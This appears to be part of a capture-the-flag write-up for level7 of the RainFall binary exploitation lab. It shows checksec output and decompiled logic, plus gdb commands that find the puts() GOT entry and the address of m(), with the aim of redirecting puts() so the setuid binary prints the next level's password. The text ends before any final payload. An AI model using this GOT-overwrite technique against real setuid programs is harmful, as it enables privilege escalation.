level7 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
```

level7 rights:
```Shell
-rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7
```

Here is what we get when testing:
```Shell
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 asd
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 asd bgj
~~
```
It's a bit similar to the previous one.
Decompiling with Ghidra on https://dogbolt.org/ shows five things:
- the program takes two arguments and has two malloc'ed variables
- `strcpy()` is used twice to copy into those variables the parameters from the command line
- the result of `fopen()`, which is reading the password, is stored into `__stream`
- `fgets()` uses a mysterious `c` string as a buffer to store the content of `__stream`
- there is an unused `m()` function that prints the content of `c`

The goal is therefore to find a way to access `m()` after the password has been loaded into `c`. Maybe we can replace the last `puts()` call by a call to `m()`.

First, let's find at which address is stored the address of `puts()` in GOT:
```Shell
(gdb) disas main
[...]
0x080485f7 <+214>:   call   0x8048400 <puts@plt>
[...]
(gdb) disas 0x8048400
[...]
0x08048400 <+0>:     jmp    *0x8049928
[...]
```
The jump is done to the address of `puts()`, which converted to Little Endian is: `\x28\x99\x04\x08`. So this is where we want to store the address of `m()`.

Let's find what it is:
```Shell
(gdb) x m
0x80484f4 <m>:  0x83e58955
```
In Little Endian: `\xf4\x84\x04\x08`.